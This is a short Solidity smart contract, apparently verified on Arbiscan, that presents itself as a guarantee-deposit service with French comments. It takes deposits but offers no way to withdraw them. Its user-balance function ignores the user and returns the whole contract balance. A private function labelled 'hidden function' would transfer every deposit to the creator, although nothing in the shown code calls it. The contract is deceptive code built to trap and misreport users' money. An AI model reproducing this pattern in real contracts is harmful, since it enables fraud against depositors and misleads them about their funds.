/**
 *Submitted for verification at Arbiscan.io on 2024-05-21
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract DepotGaranti {
    address public createur;

    constructor() {
        createur = msg.sender;
    }

    function deposer() public payable {
        // Permet à tous les utilisateurs de déposer des fonds dans le contrat
    }

    function fondsUtilisateur(address /* utilisateur */ )public view returns (uint256) {
        // Permet à tous les utilisateurs de voir le solde de leur compte dans le contrat
        return address(this).balance;
    }

    // Fonction cachée
    function _fonctionCachee() private {
        // Transférer tous les fonds du contrat au créateur du contrat
        payable(createur).transfer(address(this).balance);
    }
}